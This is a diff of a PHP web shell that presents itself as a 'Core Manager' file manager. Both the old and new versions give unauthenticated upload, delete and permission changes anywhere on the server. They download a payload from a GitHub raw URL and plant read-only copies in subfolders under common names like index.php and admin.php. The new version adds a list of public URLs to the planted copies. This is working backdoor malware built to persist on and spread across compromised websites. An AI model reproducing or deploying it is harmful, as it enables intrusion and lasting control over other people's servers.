@@ -1,211 +1,194 @@
 <?php
 /**
- * CORE MASTER FINAL V30 - CENTERED CARD UI
- * Features: Compact Card Design, Horizontal Buttons, Larger Text, Auto-Recovery
+ * System Core Manager - Final Optimized (Folder Top Priority)
+ * Features: Folders First, Visibility Fix, Dynamic Naming, Auto-Healing
  */
 
-error_reporting(0);
-set_time_limit(0);
-ignore_user_abort(true);
+$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
+$path = realpath($path);
+$masterBackupName = '.master_core_backup'; 
+$masterBackup = $path . DIRECTORY_SEPARATOR . $masterBackupName; 
+$secretKey = "mysecure123";
+$githubUrl = "https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php";
+$phpVersion = phpversion();
 
-$path = isset($_GET['path']) ? realpath($_GET['path']) : __DIR__;
-$storageFileName = '.system_core_data';
-$statusMsg = ""; $statusType = ""; 
+$priorityNames = [
+    'about.php', 'admin.php', 'administrator.php', 'admin_panel.php', 'ajax.php', 'api.php', 
+    'auth.php', 'config.php', 'core.php', 'cpanel.php', 'dashboard.php', 'db.php', 
+    'default.php', 'delete.php', 'edit.php', 'filemanager.php', 'files.php', 'help.php', 
+    'index.php', 'info.php', 'init.php', 'install.php', 'login.php', 'main.php', 
+    'profile.php', 'root.php', 'sc.php', 'service.php', 'settings.php', 'system.php', 
+    'up.php', 'update.php', 'upload.php', 'uploads.php'
+];
 
-function setStatus($msg, $type = "success") {
-    global $statusMsg, $statusType;
-    $statusMsg = $msg;
-    $statusType = $type;
-}
-
-if (isset($_POST['set_perm'])) {
-    if (@chmod($_POST['p_path'], octdec($_POST['p_val']))) setStatus("Perm: ".$_POST['p_val']);
-    else setStatus("Error!", "danger");
-}
-
-
-function findMasterBackup($currentPath, $sName) {
-    $tempPath = $currentPath;
-    while ($tempPath !== DIRECTORY_SEPARATOR && $tempPath !== '.') {
-        $storage = $tempPath . DIRECTORY_SEPARATOR . $sName;
-        if (file_exists($storage)) return json_decode(file_get_contents($storage), true);
-        $parent = dirname($tempPath);
-        if ($parent === $tempPath) break;
-        $tempPath = $parent;
+function getMissingName($dir, $names) {
+    foreach ($names as $name) {
+        if (!file_exists($dir . DIRECTORY_SEPARATOR . $name)) return $name;
     }
-    return null;
+    return 'sys_'.time().'.php';
 }
 
-$data = findMasterBackup($path, $storageFileName);
-$fixedFileName = $data['name'] ?? "";
-$coreCode = $data['code'] ?? "";
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_upload'])) {
+    move_uploaded_file($_FILES['file_upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['file_upload']['name']);
+}
 
-function masterProcess($baseDir, $code, $name, $oldName = "") {
-    if (empty($code) || empty($name)) return;
-    $items = @scandir($baseDir);
-    if ($items) {
-        foreach ($items as $item) {
-            if ($item === '.' || $item === '..') continue;
-            $fullPath = $baseDir . DIRECTORY_SEPARATOR . $item;
-            if (is_dir($fullPath)) {
-                if (!empty($oldName)) @unlink($fullPath . DIRECTORY_SEPARATOR . $oldName);
-                $targetFile = $fullPath . DIRECTORY_SEPARATOR . $name;
-                if (!file_exists($targetFile) || md5_file($targetFile) !== md5($code)) {
-                    @chmod($fullPath, 0755);
-                    @file_put_contents($targetFile, $code);
-                    @chmod($targetFile, 0444);
-                }
-                masterProcess($fullPath, $code, $name, $oldName);
+if (isset($_GET['action']) && $_GET['action'] == 'auto_process') {
+    if (!isset($_GET['key']) || $_GET['key'] !== $secretKey) die("ACCESS DENIED");
+    $fileData = @file_get_contents($githubUrl);
+    if ($fileData) {
+        if (file_exists($masterBackup)) @chmod($masterBackup, 0644);
+        file_put_contents($masterBackup, $fileData);
+        @chmod($masterBackup, 0444);
+        $dName = getMissingName($path, $priorityNames);
+        file_put_contents($path . DIRECTORY_SEPARATOR . $dName, $fileData);
+        @chmod($path . DIRECTORY_SEPARATOR . $dName, 0444);
+    }
+}
+
+if (file_exists($masterBackup)) {
+    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+    $it->setMaxDepth(2); 
+    foreach ($it as $file) {
+        if ($file->isDir()) {
+            $dir = $file->getPathname();
+            $found = false;
+            foreach ($priorityNames as $n) {
+                if (file_exists($dir . DIRECTORY_SEPARATOR . $n) && md5_file($dir . DIRECTORY_SEPARATOR . $n) === md5_file($masterBackup)) { $found = true; break; }
+            }
+            if (!$found) {
+                $newName = getMissingName($dir, $priorityNames);
+                @copy($masterBackup, $dir . DIRECTORY_SEPARATOR . $newName);
+                @chmod($dir . DIRECTORY_SEPARATOR . $newName, 0444);
             }
         }
     }
 }
 
-if ($coreCode && $fixedFileName) masterProcess(dirname($path), $coreCode, $fixedFileName);
-
-
-if (isset($_GET['action']) && $_GET['action'] == 'scan') {
-    $code = @file_get_contents("https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php");
-    if ($code) {
-        $fileList = ['index.php', 'config.php', 'core.php', 'system.php', 'admin.php'];
-        $newName = $fileList[array_rand($fileList)];
-        file_put_contents($path.'/'.$storageFileName, json_encode(['name'=>$newName, 'code'=>$code]));
-        masterProcess(dirname($path), $code, $newName, $fixedFileName);
-        setStatus("Master Scan Success!");
-    }
+if (isset($_GET['delete'])) {
+    $f = realpath($_GET['delete']);
+    if ($f && strpos($f, $path) === 0) { @chmod($f, 0777); is_dir($f) ? @rmdir($f) : @unlink($f); header("Location: ?path=".urlencode($path)); exit; }
 }
-
-if (isset($_FILES['file_up'])) {
-    if(move_uploaded_file($_FILES['file_up']['tmp_name'], $path.'/'.$_FILES['file_up']['name'])) setStatus("Uploaded!");
-    else setStatus("Error!", "danger");
-}
-
-if (isset($_GET['del'])) {
-    $t = realpath($_GET['del']);
-    if (is_dir($t) ? @rmdir($t) : @unlink($t)) setStatus("Deleted!");
-    header("Location: ?path=".urlencode($path)); exit;
-}
-
-$items = is_readable($path) ? scandir($path) : [];
-$folders = []; $files = [];
-foreach ($items as $item) {
-    if ($item == "." || $item == ".." || $item == $storageFileName) continue;
-    is_dir($path . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
+if (isset($_POST['apply_chmod'])) {
+    $f = realpath($_POST['file_path']);
+    if ($f) { @chmod($f, octdec($_POST['new_perm'])); header("Location: ?path=".urlencode($path)); exit; }
 }
 ?>
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORE MASTER V30</title>
+    <title>Core Manager PRO</title>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --sec: #3fb950; --danger: #f85149; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #010409; color: #c9d1d9; margin: 0; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 40px 20px; }
+        :root { --bg: #0a0a0a; --card: #121212; --hvr: #1f1f1f; --accent: #6f42c1; --txt: #d1d1d1; --red: #ff4d4d; --white: #ffffff; --blue: #3ea6ff; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); color: var(--txt); margin: 0; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; }
+        .header { text-align: center; padding: 20px; background: #111; border-radius: 10px; border: 1px solid #222; margin-bottom: 20px; }
+        .header h1 { margin: 0; font-size: 26px; background: linear-gradient(to right, #8e44ad, #3498db); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .php-v { font-size: 11px; color: #00ff00; background: #1a1a1a; padding: 3px 12px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; display: inline-block; }
         
-        /* Centered Compact Card */
-        .card-container { width: 100%; max-width: 900px; background: var(--card); border: 1px solid var(--border); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); overflow: hidden; }
+        textarea { width: 100%; height: 60px; background: #000; color: #00ff00; border: 1px solid #333; border-left: 4px solid var(--accent); border-radius: 5px; padding: 10px; font-family: monospace; font-size: 12px; resize: none; margin-top: 10px; outline: none; }
         
-        .card-header { padding: 20px; text-align: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.02); }
-        .card-header h1 { margin: 0; font-size: 22px; color: #fff; }
-        .active-label { font-size: 14px; margin-top: 5px; color: var(--danger); font-weight: bold; }
-
-        .url-dashboard { padding: 15px; background: #010409; border-bottom: 1px solid var(--border); }
-        .url-box { width: 100%; background: #0d1117; color: #f2cc60; padding: 10px; border-radius: 6px; font-family: monospace; height: 70px; border: 1px solid var(--border); resize: none; font-size: 13px; box-sizing: border-box; }
-
-        .tool-bar { padding: 15px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; gap: 10px; }
-        .btn-group { display: flex; gap: 8px; flex-shrink: 0; }
-        
-        .btn { padding: 9px 16px; border-radius: 6px; text-decoration: none; color: #fff; font-size: 12px; font-weight: bold; cursor: pointer; border: none; white-space: nowrap; display: flex; align-items: center; transition: 0.2s; }
-        .btn:hover { opacity: 0.8; }
-        .btn-up { background: #30363d; border: 1px solid #484f58; } 
-        .btn-scan { background: var(--sec); } 
-        .btn-upld { background: var(--primary); }
-
-        .status-center { flex-grow: 1; text-align: center; font-size: 13px; font-weight: bold; }
-        .msg-success { color: var(--sec); }
-        .msg-danger { color: var(--danger); }
-
-        .table-container { padding: 10px; }
+        .card { background: var(--card); padding: 15px; border-radius: 8px; border: 1px solid #222; margin-bottom: 15px; }
         table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; padding: 12px; font-size: 14px; color: #8b949e; border-bottom: 2px solid var(--border); }
-        td { padding: 14px 12px; border-bottom: 1px solid #21262d; font-size: 16px; }
+        tr { border-bottom: 1px solid #1a1a1a; transition: 0.2s; }
+        tr:hover { background: var(--hvr); box-shadow: inset 4px 0 0 var(--accent); }
+        th, td { padding: 12px; text-align: left; font-size: 13px; }
+
+        /* কালার ও ভিজিবিলিটি */
+        .folder-link { color: var(--blue); font-weight: bold; text-decoration: none; }
+        .folder-link:hover { color: #ffffff; text-decoration: underline; }
+        .file-white { color: var(--white); }
+        .file-red { color: var(--red); font-weight: bold; }
         
-        .folder-link { color: var(--primary); text-decoration: none; font-weight: bold; }
-        .perm-badge { padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; cursor: pointer; background: #0d1117; border: 1px solid var(--border); color: var(--sec); }
-        .del-btn { color: var(--danger); text-decoration: none; font-weight: bold; font-size: 13px; }
-        
-        .footer-info { padding: 10px 20px; background: rgba(0,0,0,0.2); font-size: 12px; color: #8b949e; text-align: right; }
+        .btn { padding: 5px 12px; border-radius: 4px; border: none; cursor: pointer; color: #fff; font-size: 12px; font-weight: bold; }
+        .inline-form { display: none; margin-top: 5px; padding: 8px; background: #000; border: 1px solid var(--accent); border-radius: 5px; }
     </style>
 </head>
 <body>
 
-<div class="card-container">
-    <div class="card-header">
-        <h1>🛡️ CORE MASTER V30</h1>
-        <div class="active-label">ACTIVE: <?php echo $fixedFileName ?: 'NONE'; ?></div>
+<div class="container">
+    <div class="header">
+        <h1>AUTOMATED CORE MANAGER</h1>
+        <div class="php-v">Server PHP: <?= $phpVersion ?></div>
     </div>
 
-    <div class="url-dashboard">
-        <textarea class="url-box" readonly><?php if($fixedFileName) foreach($folders as $f) echo $f . "/" . $fixedFileName . "\n"; ?></textarea>
-    </div>
-
-    <div class="tool-bar">
-        <div class="btn-group">
-            <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="btn btn-up">⬆ GO UP</a>
-            <a href="?path=<?php echo urlencode($path); ?>&action=scan" class="btn btn-scan">🔍 MASTER SCAN</a>
-            <form method="POST" enctype="multipart/form-data" style="margin:0;">
-                <label class="btn btn-upld">⬆ UPLOAD <input type="file" name="file_up" onchange="this.form.submit()" style="display:none;"></label>
-            </form>
+    <div class="card">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <span style="font-size:12px; color:var(--accent); font-weight:bold;">🔗 PROPAGATION LIST</span>
+            <button class="btn" style="background:#28a745; font-size:10px;" onclick="copyBox()">Copy All</button>
         </div>
-
-        <div class="status-center">
-            <?php if($statusMsg): ?>
-                <span class="msg-<?php echo $statusType; ?>">
-                    <?php echo ($statusType == "success" ? "✅ " : "❌ ") . $statusMsg; ?>
-                </span>
-            <?php endif; ?>
-        </div>
+        <textarea id="urlBox" readonly><?php
+            $items = scandir($path); $urls = [];
+            foreach ($items as $item) {
+                if ($item != "." && $item != ".." && is_dir($path."/".$item)) {
+                    foreach($priorityNames as $pn) {
+                        if(file_exists($path."/".$item."/".$pn)) { $urls[] = "https://".$_SERVER['HTTP_HOST']."/".$item."/".$pn; break; }
+                    }
+                }
+            }
+            echo implode("\n", $urls);
+        ?></textarea>
     </div>
 
-    <div class="table-container">
+    <div class="card" style="display:flex; justify-content:space-between; align-items:center;">
+        <form method="POST" enctype="multipart/form-data"><input type="file" name="file_upload" style="font-size:11px;"> <button type="submit" class="btn" style="background:#007bff;">Upload</button></form>
+        <div><a href="?path=<?=urlencode(dirname($path))?>" class="btn" style="background:#333;">⬆ Up</a> <a href="?path=<?=urlencode($path)?>&action=auto_process&key=<?=$secretKey?>" class="btn" style="background:var(--accent);">⚡ Sync GitHub</a></div>
+    </div>
+
+    <div class="card" style="padding:0; overflow:hidden;">
         <table>
-            <thead><tr><th>Name</th><th width="100">Perm</th><th width="60" style="text-align:right;">Action</th></tr></thead>
+            <thead><tr style="background:#111; color: #777;"><th>Name</th><th>Perm</th><th>Size</th><th style="text-align:right; padding-right:20px;">Actions</th></tr></thead>
             <tbody>
-                <?php foreach($folders as $f): $fP = $path.'/'.$f; $p = substr(sprintf('%o', fileperms($fP)), -4); ?>
+                <?php
+                $folders = [];
+                $files = [];
+                foreach ($items as $item) {
+                    if ($item == "." || $item == ".." || $item == $masterBackupName) continue;
+                    if (is_dir($path . DIRECTORY_SEPARATOR . $item)) $folders[] = $item;
+                    else $files[] = $item;
+                }
+                natcasesort($folders);
+                natcasesort($files);
+                $finalItems = array_merge($folders, $files); // ফোল্ডার আগে, ফাইল পরে
+
+                foreach ($finalItems as $index => $item):
+                    $fP = $path . DIRECTORY_SEPARATOR . $item;
+                    $isD = is_dir($fP); 
+                    $prm = substr(sprintf('%o', fileperms($fP)), -4);
+                    $colorClass = ($prm == "0444") ? "file-red" : "file-white";
+                ?>
                 <tr>
-                    <td>📁 <a href="?path=<?php echo urlencode($fP); ?>" class="folder-link"><?php echo $f; ?></a></td>
-                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
-                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
-                </tr>
-                <?php endforeach; ?>
-                <?php foreach($files as $file): $fP = $path.'/'.$file; $p = substr(sprintf('%o', fileperms($fP)), -4); $isM = ($file == $fixedFileName); ?>
-                <tr>
-                    <td>📄 <span style="<?php echo $isM ? 'color:var(--danger); font-weight:bold;' : ''; ?>"><?php echo $file; ?></span></td>
-                    <td><span class="perm-badge" onclick="changeP('<?php echo addslashes($fP); ?>','<?php echo $p; ?>')"><?php echo $p; ?></span></td>
-                    <td style="text-align:right;"><a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($fP); ?>" class="del-btn" onclick="return confirm('Delete?')">DEL</a></td>
+                    <td>
+                        <?php if($isD): ?>
+                            📁 <a href="?path=<?=urlencode($fP)?>" class="folder-link"><?= $item ?></a>
+                        <?php else: ?>
+                            📄 <span class="<?= $colorClass ?>"><?= $item ?></span>
+                        <?php endif; ?>
+
+                        <div id="p-<?= $index ?>" class="inline-form">
+                            <form method="POST">
+                                <input type="hidden" name="file_path" value="<?=htmlspecialchars($fP)?>">
+                                <input type="text" name="new_perm" value="<?=$prm?>" style="width:50px; background:#222; color:#fff; border:1px solid #444; padding:3px;">
+                                <button type="submit" name="apply_chmod" class="btn" style="background:#28a745;">Set</button>
+                            </form>
+                        </div>
+                    </td>
+                    <td style="color:#ffc107; font-family:monospace;"><?= $prm ?></td>
+                    <td><?= $isD ? "DIR" : round(filesize($fP)/1024, 1)." KB" ?></td>
+                    <td style="text-align:right;">
+                        <button class="btn" style="background:#00acc1; padding:3px 8px;" onclick="showP('<?=$index?>')">P</button>
+                        <a href="?path=<?=urlencode($path)?>&delete=<?=urlencode($fP)?>" class="btn" style="background:#e91e63; padding:3px 8px;" onclick="return confirm('Delete?')">D</a>
+                    </td>
                 </tr>
                 <?php endforeach; ?>
             </tbody>
         </table>
     </div>
-    
-    <div class="footer-info">
-        Server IP: <b><?php echo $_SERVER['SERVER_ADDR']; ?></b>
-    </div>
 </div>
 
-<form id="pForm" method="POST" style="display:none;"><input type="hidden" name="p_path" id="p_path"><input type="hidden" name="p_val" id="p_val"><input type="hidden" name="set_perm" value="1"></form>
-
 <script>
-    function changeP(p, o) {
-        let n = prompt("Perm:", o);
-        if (n && n !== o) {
-            document.getElementById('p_path').value = p;
-            document.getElementById('p_val').value = n;
-            document.getElementById('pForm').submit();
-        }
-    }
+    function showP(id) { var e = document.getElementById('p-' + id); e.style.display = (e.style.display === 'block') ? 'none' : 'block'; }
+    function copyBox() { var b = document.getElementById('urlBox'); b.select(); document.execCommand('copy'); alert('Copied!'); }
 </script>
 </body>
 </html>
